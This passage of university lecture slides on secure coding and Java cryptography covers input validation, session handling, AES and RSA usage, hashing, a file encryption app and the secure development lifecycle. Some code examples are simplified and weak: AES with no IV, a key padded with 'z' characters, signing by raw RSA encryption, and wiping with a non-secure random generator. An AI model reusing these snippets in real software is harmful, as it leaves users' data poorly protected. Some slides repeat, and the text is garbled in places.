Ø The attacker can send malicious information. § HTTP headers § Cookies § Hidden fields § Optional values. Ø Don’t trust the REFERER header in HTML requests. § It comes from the client and can be forged. Ø Don’t use client - side scripts for validation, authorisation , and authentication. 17 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK No Client - Side Security


<!-- Page 648 -->

Ø A session ID will be issued as soon as the user accesses a website. Ø If it is used after the user logs in, then this is an escalation of privileges problem. Ø It is easier for an attacker to get a session ID at the start of a session. 18 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Generate a New Session ID After the User Logs On


<!-- Page 649 -->

Ø Remind: SQL Injection Attacks Ø Attackers can provoke an error message in order to get information. 19 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK No Detailed Helpful Error Messages


<!-- Page 650 -->

Ø Identify every possible meta - character. Ø Check meta - characters before passing data to subsystems. § A whitelist is better than a blacklist. Ø Try to pass data separate from control information. Ø Identify all sources of input to the application. § Not just data entered by the user. § Hidden fields § Check boxes and other GUI items. Ø Once you have received information from the user, store it on the server. § Do not pass it back to the client in a hidden field. 20 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Take Care of Meta - Characters


<!-- Page 651 -->

Ø Just ask the user to enter the data again. Ø Invalid input might be a sign of an attack. Ø The attacker might anticipate the massaging and find a way round it. 21 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Do Not Auto - Correct (Massage) Invalid Data


<!-- Page 652 -->

Ø Remind: Cross Site Scripting (XSS) Attacks. Ø Make sure that information sent to the client’s browser does not include attack code. 22 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Filter All Output Data


<!-- Page 653 -->

Quiz 23 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 6. What is a buffer overrun attack. What steps must be taken to prevent it. 7. What is a poisoned null byte attack. What steps must be taken to prevent it.


<!-- Page 654 -->

Lecture 7 Coding and Security CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 1


<!-- Page 655 -->

Outline 1. SQL Injection 2. Output Handling --- 3. Programming Languages Problem 4. Java Security 5. Java Security Demo The book “ Innocent Code ” by Sverre Huseby has many useful examples. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 2


<!-- Page 656 -->

JAVA Security Packages CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 3


<!-- Page 657 -->

Ø It is a bad idea to implement our own crypto algorithms. Ø Building a secure system may need to use standard crypto algorithms. Ø We do this by using a library of supplied crypto implementations. Ø Java has its own crypto packages: § java.security.* § javax.crypto.* § javax.crypto.spec.* 4 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK JAVA Standard Crypto Libraries


<!-- Page 658 -->

Ø These libraries are implemented in the standard way. Ø All functionality is provided in interfaces. Ø Actual implementations are provided by factory methods. Ø This makes it easy to switch implementations. § The bulk of the code uses the interfaces, which will not change. § Just the factory method needs to change to select a different implementation. 5 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Crypto Libraries: Interfaces and Implementations


<!-- Page 659 -->

Ø I will cover examples of cryptographic functions using the standard Java crypto libraries § An implementation of some cryptographic functions in the file MainJavaCrypto.java . § Check it out on Moodle Ø I will then illustrate this with a program I wrote called FileEncryptionApp . § The project called FileEncryption . Check it out on Moodle 6 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Crypto Libraries: Interfaces and Implementations


<!-- Page 660 -->

Java Cryptographic Functions: Implementation CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 7


<!-- Page 661 -->

Ø Symmetric key generation. § Getting Java to provide a random AES key. § This could be used for the encryption / decryption. Ø Public Key Encryption § Creating a pair of RSA keys. § Encrypting and decrypting with these keys. Ø Message Digests Ø Digital signatures § Signing a message digest and verifying that it is correct. Ø The older functionality is in java.security Ø The later in javax.crypto 8 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK JAVA Cryptographic Functions


<!-- Page 662 -->

Ø From javax.crypto library. Ø KeyGenerator is used to generate a SecretKey . § There is only one key for AES encryption and decryption and so it must be kept secret. Ø It is generated by the getInstance factory method, specifying AES . Ø The key length is provided in the init method. Ø The key is created by the generateKey method. Ø My print_bytes method will print out a byte array in hexadecimal. Ø There is an exception to be caught (see full listing). 9 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK AES Key Generation


<!-- Page 663 -->

SecretKe y aes_key = null; .. KeyGenerator kg = KeyGenerator.getInstance ("AES"); kg.init (128); // key length 128 aes_key = kg.generateKey (); 10 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK AES Key Generation: Code


<!-- Page 664 -->

Ø javax.crypto has an abstract class called Cipher . Ø Use the getInstance factory method specifying an AES cipher. Ø Initialise it by calling the init method with the mode and key as parameters. § There are 2 possible modes. § Cipher.ENCRYPT_MODE § Cipher.DECRYPT_MODE Ø Finally, the encryption is done by the doFinal method. Ø Long files need several calls to update before doFinal . Ø There are some exceptions (not included for brevity). 11 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK AES Encryption/Decryption


<!-- Page 665 -->

import java.security .*; Cipher c = null; c = Cipher.getInstance ("AES"); c.init (mode, k); return c.doFinal (in); Ø The ciphertext / decrypted text is returned as an array of bytes. Ø I chose not to define an initialisation vector for simplicity Ø new GCMParameterSpec ( s.getTLen (), IV) wh e re I V i s a n a r r a y o f b yt e s . 12 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK AES Encryption/Decryption: Code


<!-- Page 666 -->

Ø From the earlier java.security library. § It uses initialize instead of init ! Ø KeyPairGenerator is created by the getInstance factory method. § initialize must be called with the key length in bits. § It will then generate a KeyPair Ø The KeyPair object will then provide PublicKey and PrivateKey objects. § These keys include exponent and modulus and are much longer than the AES key. § They also take significantly longer to create. 13 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK RSA Keypair Generation


<!-- Page 667 -->

PublicKey pk = null; PrivateKe y sk = null; … KeyPairGenerator kg = KeyPairGenerator.getInstance ("RSA"); kg.initialize (2048); KeyPair kp = kg.generateKeyPair (); pk = kp.getPublic (); sk = kp.getPrivate (); 14 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK RSA Keypair Generation: Code


<!-- Page 668 -->

Ø This is very similar to encrypting with AES . § getInstance specifies RSA . Ø There are a lot of possible exceptions to catch! Ø Parameters mode , key and input (array of bytes) must be provided Ø An array of bytes is produced. Cipher c = null; . . . c = Cipher.getInstance ("RSA"); c.init (mode, key); return c.doFinal (in); 15 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK RSA Encryption/Decryption


<!-- Page 669 -->

Ø Again, from the earlier java.security library. Ø A MessageDigest is created by the getInstance method § I have chosen the SHA - 256 message digest. Ø update adds an array of bytes. § Many updates can be added for long inputs. § For example, a file can be read in chunks, each updated. § The array of bytes can be reused, so that the whole file does not have to be read into memory first. Ø The digest method returns an array of bytes, the method digest. 16 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Message Digest


<!-- Page 670 -->

String mdin = new String(“long message to be hashed!"); byte[] digest = null; . . . MessageDigest md = MessageDigest . getInstance ("SHA - 256"); md.update ( mdin.getBytes ()); digest = md.digest (); 17 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Message Digest: Code


<!-- Page 671 -->

Ø The standard way of using digital signatures is to encrypt a message digest with a secret key. Ø The signature is verified by decrypting the signature with the public key and checking that the revealed message digest is the same as a message digest calculated from the same input. Ø In the code, note that we encrypt with the secret key and decrypt with the public key. Ø The isEqual method of MessageDigest compares two message digests. 18 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Digital Signature


<!-- Page 672 -->

// sign the digest byte[] signature = rsa_encdec ( Cipher.ENCRYPT_MODE , sk , digest); // undo the signature byte[] undosig = rsa_encdec ( Cipher.DECRYPT_MODE , pk, signature); // compare the two if ( MessageDigest.isEqual (digest, undosig )) System.err.println ("equal"); else System.err.println ("DIFFERENT!!!"); 19 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Digital Signature: Code


<!-- Page 673 -->

File Encryption App: Implementation CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 20


<!-- Page 674 -->

Ø This program encrypts a number of small files. § They will mainly be text files. Ø The user provides the encryption key , and the Java libraries are used to do the encryption. Ø Related files are grouped together in an index, which just produces one crypto file . § This index is compressed before being encrypted. Ø Plaintext files are created when they are opened. Ø The plaintext files are erased and then deleted when they are closed or the application closes. 21 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK File Encryption Application


<!-- Page 675 -->

Ø Encryption scheme: 128 x 128 AES . Ø The key is provided by a user as a String (<= 16 characters). Ø Be converted into a 128 - bit key suitable for AES . § This is 16 bytes. § The key is padded to 16 characters by appending ‘z’ characters. Ø Javax.crypto.spec has an abstract class (interface) called Key . Ø The implementation class SecretKeySpec is used to create an actual Key object. § The first parameter is an array of 16 bytes, from the String . § The second parameter specifies “ AES ”. 22 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Key Generation from User Input


<!-- Page 676 -->

import javax.crypto.spec .*; . . . String key . . . // pad the key to 16 characters int klen = key.length (); for (int i = klen ; i < 16; i ++) key += ‘z’; // initialise the key Object Key k = new SecretKeySpec ( key.getBytes (), "AES"); 23 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Key Generation: Code


<!-- Page 677 -->

Ø javax.crypto has an abstract class called Cipher . Ø Use the getInstance factory method specifying an AES cipher. Ø Initialise it by calling the init method with the mode and key as parameters. § There are 2 possible modes. § Cipher.ENCRYPT_MODE § Cipher.DECRYPT_MODE Ø Finally, the encryption is done by the doFinal method. Ø Long files need several calls to update before doFinal . Ø There are some exceptions (not included for brevity). 24 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK AES Encryption/Decryption


<!-- Page 678 -->

import java.security .*; Cipher c = null; c = Cipher.getInstance ("AES"); c.init (mode, k); return c.doFinal (in); Ø The ciphertext / decrypted text is returned as an array of bytes. Ø I chose not to define an initialisation vector for simplicity Ø new GCMParameterSpec ( s.getTLen (), IV) wh e re I V i s a n a r r a y o f b yt e s . 25 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK AES Encryption/Decryption: Code


<!-- Page 679 -->

Ø Compression is done with the java.util.zip library Ø Compression is done with a Deflater object and decompression with an Inflater object. Ø I store the length in 4 bytes at the front so that I can create an array of the right size when uncompressing. 26 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Compression


<!-- Page 680 -->

Deflater d = new Deflater(); d.setInput (b); d.finish (); byte[] tmp = new byte[ b.length ]; int n = d.deflate ( tmp ); Inflater u = new Inflater(); u.setInput (b, 4, b.length - 4); byte[] out = new byte[ len ]; u.inflate (out); u.end (); 27 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Compression/Decompression: Code


<!-- Page 681 -->

Ø Deleting a file does not delete the contents. Ø The disk blocks making up the file are marked for recycling. Ø I create an array of bytes that is the same length of the file and fill it with random values. Ø I then write all the bytes to the file, overwriting the content with random values. Ø Finally, I delete the file. Ø The code is in class Entry . 28 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK File Erase before Deleting


<!-- Page 682 -->

// erase content of real file Random rand = new Random(); byte[] b = new byte[(int) f.length ()]; rand.nextBytes (b); FileIO.write (f, b); // delete real file f.delete (); f = null; 29 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK File Erase: Code


<!-- Page 683 -->

A big picture of Secure Development CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 684 -->

14 - Mar - 24 31 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 685 -->

Secure Software Development Consider security throughout the Software Development LifeCycle ◦ Requirements ◦ Design ◦ Implementation ◦ Testing ◦ Deployment 14 - Mar - 24 32 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 686 -->

Requirements Identify sensitive data and resources Define security requirements for them ◦ Confidentiality ◦ Integrity ◦ Availability Consider threats and abuse cases that violate these requirements 14 - Mar - 24 33 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 687 -->

Application Specific • Abuse/Misuse Cases • Threat Models • Attacks • Assets Generic • Common Best Practices • Legal • IT • Development Architectural Risk Analysis • Underlying Framework • Ambiguity Analysis • Fundamental Weakness Attack Patterns • Historical Risks • Vulnerabilities 14 - Mar - 24 34 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 688 -->

Design Apply principles for secure software design ◦ Prevent, mitigate and detect possible attacks Security principles ◦ Favor Simplicity ◦ Trust with Reluctance ◦ Defend in Depth 14 - Mar - 24 35 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 689 -->

14 - Mar - 24 36 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 690 -->

Implementation Apply coding rules that implement secure design Use automated code review techniques to find potential vulnerabilities components ◦ Static Analysis ◦ Symbolic execution 14 - Mar - 24 37 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 691 -->

14 - Mar - 24 38 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 692 -->

Testing 1. Penetration Testing to find potential flaws in the real system ◦ Fuzz testing ◦ Employ attack patterns 14 - Mar - 24 39 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 693 -->

Penetration Testing 14 - Mar - 24 40 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 694 -->

Different Testing M ethodologies 2. BSIMM (Building Security In – Maturity Model) ◦ http://bsimm.com 3. Microsoft Security Development Lifecycle ◦ https://www.microsoft.com/en - us/sdl / 4. OpenSAMM Software Assurance Maturity Model ◦ http://opensamm.org 14 - Mar - 24 41 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 695 -->

14 - Mar - 24 42 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 696 -->

Continuous Delivery of Software 14 - Mar - 24 43 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 697 -->

14 - Mar - 24 44 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 698 -->

Continuous Security Requires security automation Integrate into CD environment and tools ◦ Source code management systems ◦ GitHub , Bitbucket etc. ◦ Build systems ◦ Travis CI, Jenkins etc. Audit third party component and open - source library usage 14 - Mar - 24 45 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 699 -->

Takeaways 1. Security practices should be built in during the software development process. 2. Continuous delivery needs continuous security. 14 - Mar - 24 46 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK